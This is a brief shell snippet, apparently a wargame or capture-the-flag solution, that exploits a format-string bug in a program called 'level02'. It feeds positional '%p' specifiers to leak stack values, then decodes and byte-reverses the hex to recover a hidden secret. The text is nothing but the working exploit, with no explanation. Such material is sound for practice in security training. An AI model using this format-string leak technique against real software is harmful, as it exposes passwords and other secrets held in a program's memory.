python -c 'print "%22$p%23$p%24$p%25$p%26$p"' | ./level02

```bash
python -c 'print "%22$p%23$p%24$p%25$p%26$p"' | ./level02 | awk 'END {print $1}' | python -c "import sys; print(''.join([value.decode('hex')[::-1] for value in sys.stdin.read().strip().split('0x')]))"
```